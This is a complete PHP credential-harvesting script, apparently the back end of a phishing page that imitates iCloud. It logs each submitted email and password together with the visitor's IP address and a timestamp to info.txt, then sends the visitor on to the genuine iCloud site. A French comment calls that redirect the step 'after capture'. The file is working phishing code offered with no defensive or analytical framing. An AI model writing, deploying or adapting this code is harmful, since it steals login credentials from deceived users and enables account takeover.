<?php
date_default_timezone_set('America/Cayenne');

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$date = date("Y-m-d H:i:s");

$log = "$date | $ip | $email | $password\n";

file_put_contents("info.txt", $log, FILE_APPEND);
header("Location: https://www.icloud.com"); // Redirection vers le vrai site après capture
exit;
?>
